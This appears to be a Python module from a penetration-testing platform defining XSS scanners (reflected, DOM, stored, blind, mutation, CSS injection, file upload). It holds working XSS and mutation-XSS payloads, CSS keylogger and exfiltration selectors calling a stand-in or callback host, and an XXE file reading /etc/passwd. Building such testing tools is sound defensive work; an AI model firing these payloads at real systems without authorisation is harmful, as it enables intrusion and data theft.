"""
XSS attack modules — registered automatically by ModuleRegistry._discover().
"""
from __future__ import annotations
from apps.modules.engine import BaseModule, FieldSchema
from apps.modules.runner import ToolRunner


# ─── [X-01] Reflected XSS Scanner (dalfox) ───────────────────────────────────

class ReflectedXSSModule(BaseModule):
    id = "X-01"
    name = "Reflected XSS Scanner"
    category = "xss"
    description = (
        "Automated reflected XSS detection using dalfox. "
        "Supports parameter fuzzing, custom headers, and JWT-authenticated sessions."
    )
    risk_level = "high"
    tags = ["xss", "dalfox", "reflected", "owasp-a03"]
    celery_queue = "xss_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/search?q=test",
            help_text="URL with at least one query parameter to fuzz.",
        ),
        FieldSchema(
            key="auth_type",
            label="Authentication",
            field_type="select",
            default="none",
            options=[
                {"value": "none",        "label": "No Auth"},
                {"value": "cookie",      "label": "Cookie"},
                {"value": "bearer_jwt",  "label": "Bearer JWT"},
                {"value": "basic",       "label": "Basic Auth"},
            ],
        ),
        FieldSchema(
            key="cookie_value",
            label="Cookie",
            field_type="text",
            required=False,
            placeholder="session=abc123; other=val",
            sensitive=True,
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="jwt_token",
            label="Bearer JWT Token",
            field_type="textarea",
            required=False,
            placeholder="eyJhbGciOiJIUzI1NiJ9...",
            sensitive=True,
            show_if={"auth_type": "bearer_jwt"},
        ),
        FieldSchema(
            key="basic_credentials",
            label="Basic Auth (user:pass)",
            field_type="text",
            required=False,
            placeholder="admin:password",
            sensitive=True,
            show_if={"auth_type": "basic"},
        ),
        FieldSchema(
            key="custom_headers",
            label="Custom Headers",
            field_type="header_list",
            required=False,
            placeholder="X-Custom-Header: value",
            help_text="One header per line in 'Name: Value' format.",
        ),
        FieldSchema(
            key="follow_redirects",
            label="Follow Redirects",
            field_type="toggle",
            default=True,
        ),
        FieldSchema(
            key="blind_xss",
            label="Enable Blind XSS Payload",
            field_type="toggle",
            default=False,
            help_text="Inject out-of-band callback payloads.",
        ),
        FieldSchema(
            key="oast_endpoint",
            label="OAST Callback URL (for blind XSS)",
            field_type="url",
            required=False,
            placeholder="https://your.interactsh.server",
            show_if={"blind_xss": "true"},
        ),
        FieldSchema(
            key="threads",
            label="Threads",
            field_type="range_slider",
            default=10,
            min_value=1,
            max_value=50,
            step=5,
        ),
        FieldSchema(
            key="timeout",
            label="Request Timeout (s)",
            field_type="number",
            default=10,
            min_value=5,
            max_value=60,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        runner = ToolRunner("dalfox")
        out_file = runner.output_file_path(job_id, "txt")

        args = [
            "url", params["target_url"],
            "--output", str(out_file),
            "--format", "plain",
            "--worker", str(params.get("threads", 10)),
            "--timeout", str(params.get("timeout", 10)),
        ]

        if params.get("follow_redirects"):
            args.append("--follow-redirects")

        # Auth headers
        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("cookie_value"):
            args += ["--cookie", params["cookie_value"]]
        elif auth_type == "bearer_jwt" and params.get("jwt_token"):
            args += ["--header", f"Authorization: Bearer {params['jwt_token'].strip()}"]
        elif auth_type == "basic" and params.get("basic_credentials"):
            import base64
            cred_b64 = base64.b64encode(params["basic_credentials"].encode()).decode()
            args += ["--header", f"Authorization: Basic {cred_b64}"]

        # Custom headers (one per line)
        custom = params.get("custom_headers", "").strip()
        if custom:
            for line in custom.splitlines():
                line = line.strip()
                if ":" in line:
                    args += ["--header", line]

        # Blind XSS
        if params.get("blind_xss") and params.get("oast_endpoint"):
            args += ["--blind", params["oast_endpoint"]]

        # Build mask patterns for sensitive params
        mask = []
        if params.get("cookie_value"):
            import re
            mask.append(re.escape(params["cookie_value"]))
        if params.get("jwt_token"):
            mask.append(params["jwt_token"].strip()[:20])

        stream("info", "Launching dalfox XSS scanner...")
        result = runner.run(args=args, stream=stream, timeout=self.time_limit, mask_patterns=mask or None)

        findings = _parse_dalfox_output(str(out_file), params["target_url"], stream)

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
        }


def _parse_dalfox_output(out_path: str, url: str, stream) -> list[dict]:
    import os, re
    findings = []
    if not os.path.exists(out_path):
        return findings
    try:
        with open(out_path) as f:
            for line in f:
                line = line.strip()
                if not line:
                    continue
                severity = "high"
                if "[V]" in line or "Verified" in line:
                    severity = "high"
                elif "[P]" in line or "PoC" in line:
                    severity = "medium"
                elif "Triggered" in line:
                    severity = "high"
                findings.append({
                    "title": "Reflected XSS Found",
                    "severity": severity,
                    "url": url,
                    "description": line,
                    "evidence": line,
                    "remediation": (
                        "Encode all user-controlled output. "
                        "Use a strict Content-Security-Policy. "
                        "Apply input validation server-side."
                    ),
                    "cwe_id": "CWE-79",
                })
    except Exception as e:
        stream("warning", f"Failed to parse dalfox output: {e}")
    return findings


# ─── [X-02] DOM XSS Finder (katana + manual patterns) ──────────────────────

class DOMXSSModule(BaseModule):
    id = "X-03"
    name = "DOM XSS Finder"
    category = "xss"
    description = (
        "Crawl the target with katana and detect DOM XSS sinks/sources "
        "in JavaScript (innerHTML, document.write, eval, location.hash, etc.)."
    )
    risk_level = "high"
    tags = ["dom-xss", "katana", "javascript", "owasp-a03"]
    celery_queue = "xss_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com",
        ),
        FieldSchema(
            key="depth",
            label="Crawl Depth",
            field_type="range_slider",
            default=3,
            min_value=1,
            max_value=10,
            step=1,
        ),
        FieldSchema(
            key="js_crawl",
            label="Parse JavaScript for endpoints",
            field_type="toggle",
            default=True,
        ),
        FieldSchema(
            key="auth_cookie",
            label="Authentication Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import os, re
        runner = ToolRunner("katana")
        out_file = runner.output_file_path(job_id, "txt")

        args = [
            "-u", params["target_url"],
            "-d", str(params.get("depth", 3)),
            "-o", str(out_file), "-silent",
        ]
        if params.get("js_crawl"):
            args.append("-jc")
        if params.get("auth_cookie"):
            args += ["-H", f"Cookie: {params['auth_cookie']}"]

        mask = [params["auth_cookie"]] if params.get("auth_cookie") else None

        stream("info", "Crawling with katana...")
        runner.run(args=args, stream=stream, timeout=240, mask_patterns=mask)

        findings = []
        dom_sinks = re.compile(
            r"(innerHTML|outerHTML|document\.write|eval\(|setTimeout\(|setInterval\("
            r"|location\.hash|location\.search|location\.href|document\.cookie"
            r"|insertAdjacentHTML)",
            re.IGNORECASE,
        )
        if os.path.exists(out_file):
            with open(out_file) as f:
                for url in f:
                    url = url.strip()
                    if dom_sinks.search(url):
                        findings.append({
                            "title": "Potential DOM XSS Sink",
                            "severity": "medium",
                            "url": url,
                            "description": f"Dangerous DOM sink pattern detected in URL: {url}",
                            "evidence": url,
                            "remediation": "Sanitize with DOMPurify before writing to DOM sinks.",
                            "cwe_id": "CWE-79",
                        })
            stream("success", f"Crawl complete. {len(findings)} potential DOM XSS sinks found.")

        return {"status": "done", "findings": findings}


# ─── [X-02] Stored XSS ────────────────────────────────────────────────────────

class StoredXSSModule(BaseModule):
    id = "X-02"
    name = "Stored XSS"
    category = "xss"
    description = (
        "Detect stored (persistent) XSS by submitting a payload to a write endpoint, "
        "then fetching the retrieval endpoint to check if the payload executes."
    )
    risk_level = "high"
    tags = ["xss", "stored", "persistent", "owasp-a03"]
    celery_queue = "xss_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="submit_url",
            label="Submit Endpoint (write)",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/comments",
            help_text="Endpoint that accepts and stores user input (POST).",
        ),
        FieldSchema(
            key="submit_method",
            label="Submit Method",
            field_type="select",
            default="POST",
            options=[
                {"value": "POST",  "label": "POST"},
                {"value": "PUT",   "label": "PUT"},
                {"value": "PATCH", "label": "PATCH"},
            ],
        ),
        FieldSchema(
            key="submit_param",
            label="Vulnerable Parameter Name",
            field_type="text",
            required=True,
            placeholder="comment",
            help_text="The form field or JSON key that stores the user input.",
        ),
        FieldSchema(
            key="submit_content_type",
            label="Content Type",
            field_type="select",
            default="form",
            options=[
                {"value": "form", "label": "application/x-www-form-urlencoded"},
                {"value": "json", "label": "application/json"},
            ],
        ),
        FieldSchema(
            key="extra_fields",
            label="Extra POST Fields",
            field_type="textarea",
            required=False,
            placeholder="field1=value1\nfield2=value2",
            help_text="Additional form fields needed for the submission (one per line).",
        ),
        FieldSchema(
            key="retrieve_url",
            label="Retrieval Endpoint (read)",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/comments",
            help_text="Endpoint where stored content is served back.",
        ),
        FieldSchema(
            key="auth_type",
            label="Authentication",
            field_type="select",
            default="none",
            options=[
                {"value": "none",       "label": "No Auth"},
                {"value": "cookie",     "label": "Cookie"},
                {"value": "bearer_jwt", "label": "Bearer JWT"},
            ],
        ),
        FieldSchema(
            key="auth_value",
            label="Auth Value (cookie or token)",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123 or eyJ...",
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="jwt_token",
            label="Bearer JWT Token",
            field_type="textarea",
            required=False,
            sensitive=True,
            placeholder="eyJhbGciOiJIUzI1NiJ9...",
            show_if={"auth_type": "bearer_jwt"},
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS Certificate",
            field_type="toggle",
            default=True,
        ),
    ]

    _PAYLOADS = [
        '<script>alert("SXSS-pentools")</script>',
        '"><script>alert("SXSS-pentools")</script>',
        "<img src=x onerror=\"alert('SXSS-pentools')\">",
        "javascript:alert('SXSS-pentools')",
        '<svg/onload=alert("SXSS-pentools")>',
        "';alert('SXSS-pentools')//",
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        findings = []

        # Build auth headers
        headers: dict[str, str] = {"User-Agent": "PenTools/StoredXSS"}
        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("auth_value"):
            headers["Cookie"] = params["auth_value"]
        elif auth_type == "bearer_jwt" and params.get("jwt_token"):
            headers["Authorization"] = f"Bearer {params['jwt_token'].strip()}"

        submit_url = params["submit_url"]
        retrieve_url = params["retrieve_url"]
        param_name = params["submit_param"]
        method = params.get("submit_method", "POST")
        content_type = params.get("submit_content_type", "form")

        # Parse extra fields
        extra: dict[str, str] = {}
        for line in params.get("extra_fields", "").splitlines():
            if "=" in line:
                k, _, v = line.partition("=")
                extra[k.strip()] = v.strip()

        stream("info", f"Testing {len(self._PAYLOADS)} stored XSS payloads against {submit_url}")

        for idx, payload in enumerate(self._PAYLOADS):
            tag = f"pentools-{idx}"
            # Use unique marker in payload
            actual_payload = payload.replace("pentools", f"pentools-{idx}")
            try:
                body = {**extra, param_name: actual_payload}
                if content_type == "json":
                    resp = requests.request(
                        method, submit_url, json=body, headers=headers,
                        timeout=15, verify=verify, allow_redirects=True,
                    )
                else:
                    resp = requests.request(
                        method, submit_url, data=body, headers=headers,
                        timeout=15, verify=verify, allow_redirects=True,
                    )
                stream("info", f"Payload {idx+1}/{len(self._PAYLOADS)} submitted → HTTP {resp.status_code}")
            except Exception as e:
                stream("warning", f"Submit failed for payload {idx+1}: {e}")
                continue

            # Fetch retrieval endpoint
            try:
                get_resp = requests.get(
                    retrieve_url, headers=headers,
                    timeout=15, verify=verify,
                )
                body_text = get_resp.text
                if tag in body_text and ("<script" in body_text or "onerror="  in body_text or "onload=" in body_text):
                    stream("success", f"STORED XSS CONFIRMED — payload {idx+1} reflected unescaped!")
                    findings.append({
                        "title": "Stored XSS Detected",
                        "severity": "high",
                        "url": retrieve_url,
                        "description": (
                            f"Stored XSS payload was reflected unescaped from {retrieve_url}. "
                            f"The payload was submitted to {submit_url} via HTTP {method}."
                        ),
                        "evidence": f"Payload: {actual_payload}\nFound in response from: {retrieve_url}\nSnippet: {body_text[:300]}",
                        "remediation": (
                            "Encode all user-supplied data at output (HTML entity encoding). "
                            "Use a Content Security Policy to block inline scripts."
                        ),
                        "cwe_id": "CWE-79",
                    })
                    break  # One confirmed finding is enough
                else:
                    stream("info", f"Payload {idx+1} not found unescaped in retrieval response")
            except Exception as e:
                stream("warning", f"Retrieval check failed: {e}")

        status = "done"
        if not findings:
            stream("info", "No stored XSS detected with tested payloads.")
        return {"status": status, "findings": findings}


# ─── [X-04] Blind XSS (OOB) ──────────────────────────────────────────────────

class BlindXSSModule(BaseModule):
    id = "X-04"
    name = "Blind XSS (OOB)"
    category = "xss"
    description = (
        "Out-of-band Blind XSS detection using dalfox with a callback/interactsh server. "
        "Payloads fire asynchronously; confirmation arrives via OOB ping."
    )
    risk_level = "high"
    tags = ["xss", "blind", "oob", "interactsh", "oast", "dalfox"]
    celery_queue = "xss_queue"
    time_limit = 300

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/feedback?msg=test",
            help_text="URL with parameter(s) to inject blind XSS payloads into.",
        ),
        FieldSchema(
            key="oast_url",
            label="OOB Callback URL",
            field_type="url",
            required=True,
            placeholder="https://xxxx.oast.fun",
            help_text="Your interactsh/XSS Hunter callback domain.",
            oast_callback=True,
        ),
        FieldSchema(
            key="auth_type",
            label="Authentication",
            field_type="select",
            default="none",
            options=[
                {"value": "none",       "label": "No Auth"},
                {"value": "cookie",     "label": "Cookie"},
                {"value": "bearer_jwt", "label": "Bearer JWT"},
            ],
        ),
        FieldSchema(
            key="cookie_value",
            label="Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="jwt_token",
            label="Bearer JWT Token",
            field_type="textarea",
            required=False,
            sensitive=True,
            placeholder="eyJhbGciOiJIUzI1NiJ9...",
            show_if={"auth_type": "bearer_jwt"},
        ),
        FieldSchema(
            key="scan_depth",
            label="Scan Depth (dalfox worker threads)",
            field_type="range_slider",
            default=10,
            min_value=1,
            max_value=30,
            step=1,
        ),
        FieldSchema(
            key="timeout",
            label="Timeout (s)",
            field_type="number",
            default=30,
            min_value=10,
            max_value=120,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        runner = ToolRunner("dalfox")

        args = [
            "url", params["target_url"],
            "--blind", params["oast_url"],
            "--worker", str(params.get("scan_depth", 10)),
            "--timeout", str(params.get("timeout", 30)),
            "--format", "plain",
            "--no-color",
        ]

        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("cookie_value"):
            args += ["--cookie", params["cookie_value"]]
        elif auth_type == "bearer_jwt" and params.get("jwt_token"):
            args += ["--header", f"Authorization: Bearer {params['jwt_token'].strip()}"]

        mask = []
        if params.get("cookie_value"):
            mask.append(params["cookie_value"][:10])
        if params.get("jwt_token"):
            mask.append(params["jwt_token"].strip()[:20])

        stream("info", f"Injecting blind XSS payloads — callbacks to: {params['oast_url']}")
        stream("warning", "Blind XSS fires asynchronously. Check your OOB server for incoming pings.")

        result = runner.run(
            args=args, stream=stream, timeout=self.time_limit,
            mask_patterns=mask or None,
        )

        # Blind XSS can't be confirmed synchronously — report as informational
        findings = []
        if result["returncode"] == 0:
            findings.append({
                "title": "Blind XSS Payloads Injected (OOB Pending)",
                "severity": "info",
                "url": params["target_url"],
                "description": (
                    "Blind XSS payloads were successfully injected. "
                    f"Monitor your OOB server at {params['oast_url']} for confirmations. "
                    "If you receive a callback, severity escalates to High."
                ),
                "evidence": f"Dalfox exit code: {result['returncode']}\nCallback domain: {params['oast_url']}",
                "remediation": (
                    "Encode all user-supplied data before rendering in admin interfaces or email templates. "
                    "Apply a strict Content Security Policy."
                ),
                "cwe_id": "CWE-79",
            })

        return {
            "status": "done" if result["returncode"] == 0 else "failed",
            "findings": findings,
        }


# ─── [X-05] mXSS — Mutation XSS ──────────────────────────────────────────────

class MutationXSSModule(BaseModule):
    id = "X-05"
    name = "mXSS — Mutation XSS"
    category = "xss"
    description = (
        "Tests mutation-based XSS payloads that rely on browser HTML parser quirks. "
        "Evaluates DOM mutation vectors: template, noscript, table, form, title, and attribute contexts."
    )
    risk_level = "high"
    tags = ["xss", "mutation", "mxss", "browser-parser", "owasp-a03"]
    celery_queue = "xss_queue"
    time_limit = 240

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/search?q=test",
        ),
        FieldSchema(
            key="inject_param",
            label="Parameter to Inject",
            field_type="text",
            required=False,
            placeholder="q",
            help_text="Leave blank to test all URL parameters.",
        ),
        FieldSchema(
            key="auth_type",
            label="Authentication",
            field_type="select",
            default="none",
            options=[
                {"value": "none",       "label": "No Auth"},
                {"value": "cookie",     "label": "Cookie"},
                {"value": "bearer_jwt", "label": "Bearer JWT"},
            ],
        ),
        FieldSchema(
            key="cookie_value",
            label="Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="context",
            label="Injection Context Hints",
            field_type="checkbox_group",
            default=["html", "attr", "js", "template"],
            options=[
                {"value": "html",     "label": "HTML tag context"},
                {"value": "attr",     "label": "Attribute value context"},
                {"value": "js",       "label": "JavaScript string context"},
                {"value": "template", "label": "Template/noscript context"},
                {"value": "table",    "label": "Table/form context"},
            ],
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    # Mutation XSS payload categories
    _PAYLOADS_BY_CONTEXT = {
        "html": [
            '<noscript><p title="</noscript><img src=x onerror=alert(1)>">',
            '<form><math><mtext></form><form><mglyph><svg><mtext><style><path id="</style><img onerror=alert(1) src>">',
            '<table><tbody><tr><td>"<img src=x onerror=alert(1)>',
        ],
        "attr": [
            '" autofocus onfocus=alert(1) x="',
            "' autofocus onfocus=alert(1) x='",
            '" onmouseover=alert(1) style="x:expression(alert(1))',
        ],
        "js": [
            "\\u003cscript\\u003ealert(1)\\u003c/script\\u003e",
            "</script><script>alert(1)</script>",
            "'-alert(1)-'",
        ],
        "template": [
            "<plaintext>",
            "<xmp>",
            "<listing><img src=x onerror=alert(1)>",
        ],
        "table": [
            "<td><img src=x onerror=alert(1)>",
            "<caption><img src=x onerror=alert(1)>",
        ],
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib.parse
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        findings = []

        headers: dict[str, str] = {"User-Agent": "PenTools/mXSS"}
        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("cookie_value"):
            headers["Cookie"] = params["cookie_value"]

        base_url = params["target_url"]
        parsed = urllib.parse.urlparse(base_url)
        existing_params = urllib.parse.parse_qs(parsed.query, keep_blank_values=True)

        # Determine params to test
        target_param = params.get("inject_param", "").strip()
        test_params = [target_param] if target_param else list(existing_params.keys()) or ["q"]

        selected_contexts = params.get("context", ["html", "attr", "js", "template"])

        payloads: list[str] = []
        for ctx in selected_contexts:
            payloads.extend(self._PAYLOADS_BY_CONTEXT.get(ctx, []))

        stream("info", f"Testing {len(payloads)} mutation payloads on params: {test_params}")

        for param in test_params:
            for payload in payloads:
                query = {**{k: v[0] for k, v in existing_params.items()}, param: payload}
                test_url = urllib.parse.urlunparse(
                    parsed._replace(query=urllib.parse.urlencode(query))
                )
                try:
                    resp = requests.get(
                        test_url, headers=headers, timeout=12,
                        verify=verify, allow_redirects=True,
                    )
                    body = resp.text

                    # Check for unescaped dangerous patterns in response
                    dangerous = (
                        "onerror=" in body and "<img" in body
                        or "onfocus=" in body
                        or "onmouseover=" in body
                        or "<script>" in body.lower()
                        or "alert(" in body
                    )
                    if dangerous and payload[:15] in body:
                        stream("success", f"Potential mXSS in param '{param}': {payload[:40]}...")
                        findings.append({
                            "title": f"Mutation XSS (mXSS) — param '{param}'",
                            "severity": "high",
                            "url": test_url,
                            "description": (
                                f"A mutation-based XSS payload was reflected unescaped in the response body "
                                f"for parameter '{param}'. The browser HTML parser may mutate this into executable JavaScript."
                            ),
                            "evidence": f"Payload: {payload}\nURL: {test_url}\nResponse snippet: {body[:400]}",
                            "remediation": (
                                "Apply HTML entity encoding to all user-controlled output. "
                                "Use a DOM sanitizer such as DOMPurify on client-side rendering. "
                                "Review template and noscript tag handling."
                            ),
                            "cwe_id": "CWE-79",
                        })
                except Exception as e:
                    stream("warning", f"Request failed for payload: {e}")

        stream("info", f"mXSS scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [X-06] CSS Injection ─────────────────────────────────────────────────────

class CSSInjectionModule(BaseModule):
    id = "X-06"
    name = "CSS Injection"
    category = "xss"
    description = (
        "Detect CSS injection vulnerabilities that enable data exfiltration via "
        "CSS attribute selectors, import rules, or style injection leading to UI redressing."
    )
    risk_level = "medium"
    tags = ["css-injection", "data-exfil", "ui-redress", "owasp-a03"]
    celery_queue = "xss_queue"
    time_limit = 120

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="target_url",
            label="Target URL",
            field_type="url",
            required=True,
            placeholder="https://example.com/profile?theme=dark",
        ),
        FieldSchema(
            key="inject_param",
            label="Injectable Parameter",
            field_type="text",
            required=True,
            placeholder="theme",
            help_text="The URL/POST parameter that gets injected into a CSS context.",
        ),
        FieldSchema(
            key="inject_via",
            label="Injection Vector",
            field_type="radio",
            default="get",
            options=[
                {"value": "get",  "label": "GET parameter"},
                {"value": "post", "label": "POST body"},
            ],
        ),
        FieldSchema(
            key="oast_domain",
            label="Exfil Callback Domain (optional)",
            field_type="text",
            required=False,
            placeholder="xxxx.oast.fun",
            help_text="CSS @import to this domain confirms exfiltration pathway.",
            oast_callback=True,
        ),
        FieldSchema(
            key="auth_cookie",
            label="Session Cookie",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        findings = []

        headers: dict[str, str] = {"User-Agent": "PenTools/CSSInjection"}
        if params.get("auth_cookie"):
            headers["Cookie"] = params["auth_cookie"]

        probe_url  = params["target_url"]
        param_name = params["inject_param"]
        via        = params.get("inject_via", "get")
        oast       = params.get("oast_domain", "").strip()

        probes = [
            ("break-out",     "}body{background:red}",                          "CSS break-out"),
            ("import",        f"@import url('http://{oast}/css')" if oast else "@import url('https://example.com')", "CSS @import"),
            ("attr-selector", "[value^='a']{background:url('http://x.x/a')}", "CSS attribute selector"),
            ("expression",    "expression(alert(1))",                            "CSS expression (IE)"),
            ("keylogger",     "input[value^='a']{background:url(//x.x/a)}",     "CSS keylogger pattern"),
        ]

        stream("info", f"Testing CSS injection on parameter '{param_name}'")

        for probe_id, payload, label in probes:
            try:
                if via == "get":
                    import urllib.parse
                    from urllib.parse import urlparse, parse_qs, urlencode, urlunparse
                    parsed = urlparse(probe_url)
                    qp = parse_qs(parsed.query, keep_blank_values=True)
                    qp[param_name] = [payload]
                    test_url = urlunparse(parsed._replace(query=urlencode(qp, doseq=True)))
                    resp = requests.get(test_url, headers=headers, timeout=12, verify=verify)
                else:
                    test_url = probe_url
                    resp = requests.post(
                        probe_url, data={param_name: payload},
                        headers=headers, timeout=12, verify=verify,
                    )

                body = resp.text
                # Check if our payload appears in a <style> block or CSS context
                if payload[:15] in body and ("<style" in body or "text/css" in body.lower()):
                    stream("success", f"CSS injection detected: {label}")
                    findings.append({
                        "title": f"CSS Injection — {label}",
                        "severity": "medium",
                        "url": test_url,
                        "description": (
                            f"The parameter '{param_name}' was reflected inside a CSS context "
                            f"without sanitization, enabling {label}."
                        ),
                        "evidence": f"Payload: {payload}\nFound in response (CSS context): {body[:300]}",
                        "remediation": (
                            "Whitelist valid CSS values — never interpolate user input into CSS. "
                            "Use a strict Content Security Policy that blocks inline styles."
                        ),
                        "cwe_id": "CWE-74",
                    })
                else:
                    stream("info", f"No CSS injection for probe: {label}")
            except Exception as e:
                stream("warning", f"Request failed ({label}): {e}")

        stream("info", f"CSS injection scan complete — {len(findings)} findings")
        return {"status": "done", "findings": findings}


# ─── [X-07] XSS via File Upload ───────────────────────────────────────────────

class FileUploadXSSModule(BaseModule):
    id = "X-07"
    name = "XSS via File Upload"
    category = "xss"
    description = (
        "Test file upload endpoints for XSS via SVG, HTML, and XML uploads. "
        "Crafted files with embedded JavaScript are uploaded and the served URL is checked."
    )
    risk_level = "high"
    tags = ["xss", "file-upload", "svg", "html", "xml", "owasp-a03"]
    celery_queue = "xss_queue"
    time_limit = 180

    PARAMETER_SCHEMA = [
        FieldSchema(
            key="upload_url",
            label="File Upload Endpoint",
            field_type="url",
            required=True,
            placeholder="https://example.com/api/upload",
        ),
        FieldSchema(
            key="file_param",
            label="File Input Field Name",
            field_type="text",
            required=True,
            default="file",
            placeholder="file",
        ),
        FieldSchema(
            key="file_types",
            label="File Types to Test",
            field_type="checkbox_group",
            default=["svg", "html"],
            options=[
                {"value": "svg",  "label": "SVG (image/svg+xml)"},
                {"value": "html", "label": "HTML (text/html)"},
                {"value": "xml",  "label": "XML (text/xml)"},
                {"value": "xhtml","label": "XHTML (application/xhtml+xml)"},
            ],
        ),
        FieldSchema(
            key="retrieve_base_url",
            label="Base URL where uploaded files are served",
            field_type="url",
            required=False,
            placeholder="https://example.com/uploads/",
            help_text="If the upload response contains the file URL, leave blank.",
        ),
        FieldSchema(
            key="auth_type",
            label="Authentication",
            field_type="select",
            default="none",
            options=[
                {"value": "none",       "label": "No Auth"},
                {"value": "cookie",     "label": "Cookie"},
                {"value": "bearer_jwt", "label": "Bearer JWT"},
            ],
        ),
        FieldSchema(
            key="auth_value",
            label="Cookie / Token",
            field_type="text",
            required=False,
            sensitive=True,
            placeholder="session=abc123",
            show_if={"auth_type": "cookie"},
        ),
        FieldSchema(
            key="jwt_token",
            label="Bearer JWT",
            field_type="textarea",
            required=False,
            sensitive=True,
            show_if={"auth_type": "bearer_jwt"},
        ),
        FieldSchema(
            key="verify_tls",
            label="Verify TLS",
            field_type="toggle",
            default=True,
        ),
    ]

    _FILE_TYPES = {
        "svg": (
            "pentools-xss.svg",
            "image/svg+xml",
            b'<?xml version="1.0"?>'
            b'<svg xmlns="http://www.w3.org/2000/svg" onload="alert(\'PentoolsXSS\')">'
            b'<circle cx="50" cy="50" r="40"/></svg>',
        ),
        "html": (
            "pentools-xss.html",
            "text/html",
            b'<html><body><script>alert("PentoolsXSS")</script></body></html>',
        ),
        "xml": (
            "pentools-xss.xml",
            "text/xml",
            b'<?xml version="1.0"?>'
            b'<!DOCTYPE foo [<!ENTITY xxe SYSTEM "file:///etc/passwd">]>'
            b'<root>&xxe;</root>',
        ),
        "xhtml": (
            "pentools-xss.xhtml",
            "application/xhtml+xml",
            b'<!DOCTYPE html><html xmlns="http://www.w3.org/1999/xhtml">'
            b'<body><script>alert("PentoolsXSS")</script></body></html>',
        ),
    }

    def execute(self, params: dict, job_id: str, stream) -> dict:
        import requests
        import urllib3
        import re

        urllib3.disable_warnings()
        verify = params.get("verify_tls", True)
        findings = []

        headers: dict[str, str] = {"User-Agent": "PenTools/FileUploadXSS"}
        auth_type = params.get("auth_type", "none")
        if auth_type == "cookie" and params.get("auth_value"):
            headers["Cookie"] = params["auth_value"]
        elif auth_type == "bearer_jwt" and params.get("jwt_token"):
            headers["Authorization"] = f"Bearer {params['jwt_token'].strip()}"

        upload_url = params["upload_url"]
        file_param = params.get("file_param", "file")
        file_types = params.get("file_types", ["svg", "html"])
        retrieve_base = params.get("retrieve_base_url", "").rstrip("/")

        for ftype in file_types:
            if ftype not in self._FILE_TYPES:
                continue
            fname, mime, content = self._FILE_TYPES[ftype]
            stream("info", f"Uploading {ftype.upper()} XSS payload as '{fname}'")

            try:
                files = {file_param: (fname, content, mime)}
                resp = requests.post(
                    upload_url, files=files, headers=headers,
                    timeout=20, verify=verify,
                )
                stream("info", f"Upload response: HTTP {resp.status_code}")

                # Try to find served URL in response
                body = resp.text
                url_match = re.search(r'https?://[^\s"\'<>]+' + re.escape(fname), body)
                served_url = url_match.group(0) if url_match else (
                    f"{retrieve_base}/{fname}" if retrieve_base else None
                )

                if resp.status_code in (200, 201) and served_url:
                    # Fetch the served file
                    served_resp = requests.get(
                        served_url, headers=headers, timeout=15, verify=verify,
                    )
                    if "PentoolsXSS" in served_resp.text or "alert(" in served_resp.text:
                        stream("success", f"XSS via {ftype.upper()} upload confirmed — {served_url}")
                        findings.append({
                            "title": f"XSS via {ftype.upper()} File Upload",
                            "severity": "high",
                            "url": served_url,
                            "description": (
                                f"The server stored and serves an uploaded {ftype.upper()} file "
                                f"containing JavaScript without sanitization. When accessed, "
                                f"the JavaScript executes in the victim's browser."
                            ),
                            "evidence": f"Upload endpoint: {upload_url}\nServed at: {served_url}\nFile type: {mime}",
                            "remediation": (
                                "Validate MIME type server-side — do not trust the Content-Type header. "
                                "Serve user uploads from a separate cookieless domain. "
                                "Scan uploaded files for embedded scripts before storage."
                            ),
                            "cwe_id": "CWE-79",
                        })
                    else:
                        stream("info", f"{ftype.upper()} uploaded but payload not served as-is")
                elif resp.status_code == 403 or resp.status_code == 422:
                    stream("info", f"{ftype.upper()} upload blocked (HTTP {resp.status_code}) — server has some protection")
                else:
                    stream("info", f"{ftype.upper()} upload returned HTTP {resp.status_code}")

            except Exception as e:
                stream("warning", f"Upload test failed for {ftype}: {e}")

        stream("info", f"File upload XSS scan complete — {len(findings)} findings")
